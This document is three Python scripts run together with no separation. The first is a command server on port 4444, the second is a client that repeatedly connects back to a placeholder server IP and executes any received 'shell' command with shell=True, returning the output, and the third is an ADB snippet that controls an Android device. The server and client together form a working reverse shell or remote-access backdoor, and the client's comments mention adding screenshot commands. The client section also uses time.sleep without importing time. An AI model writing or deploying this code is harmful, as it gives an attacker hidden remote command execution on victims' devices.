import socket
import time

# Server configuration
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 4444       # Port to listen on

# Create socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)

print(f"Server listening on {HOST}:{PORT}")

# Accept client connection
client_socket, client_address = server_socket.accept()
print(f"Connected to {client_address}")

# Main loop to send commands
while True:
    try:
        command = input("Enter command: ")
        if command.lower() == "exit":
            client_socket.send(command.encode())
            break
        
        # Send command to client
        client_socket.send(command.encode())
        
        # Receive response from client
        response = client_socket.recv(1024).decode()
        print(f"Response: {response}")
        
    except Exception as e:
        print(f"Error: {e}")
        break

# Cleanup
client_socket.close()
server_socket.close()
import socket
import os
import subprocess

# Client configuration
SERVER_HOST = "YOUR_SERVER_IP"  # Replace with your server's IP
SERVER_PORT = 4444

# Create socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to server
while True:
    try:
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        print("Connected to server")
        break
    except:
        print("Connection failed, retrying...")
        time.sleep(2)

# Main loop to receive and execute commands
while True:
    try:
        # Receive command from server
        command = client_socket.recv(1024).decode()
        
        if command.lower() == "exit":
            break
        
        # Execute command and get output
        try:
            if command.startswith("shell "):
                # Run shell commands (e.g., "shell ls" could map to Android's "dir" equivalent)
                cmd = command[6:]  # Strip "shell " prefix
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
            else:
                # Add custom commands here (e.g., "battery" or "screenshot")
                result = f"Unknown command: {command}"
        except Exception as e:
            result = f"Error executing command: {e}"
        
        # Send result back to server
        client_socket.send(result.encode())
        
    except Exception as e:
        print(f"Error: {e}")
        break

# Cleanup
client_socket.close()
from ppadb.client import Client as AdbClient

# Connect to ADB
client = AdbClient(host="127.0.0.1", port=5037)
devices = client.devices()
if not devices:
    print("No devices found")
    exit()

device = devices[0]  # Use the first connected device

# Example: Tap screen at coordinates (x, y)
device.shell("input tap 500 500")

# Example: Get battery level
battery = device.shell("dumpsys battery | grep level")
print(f"Battery level: {battery}")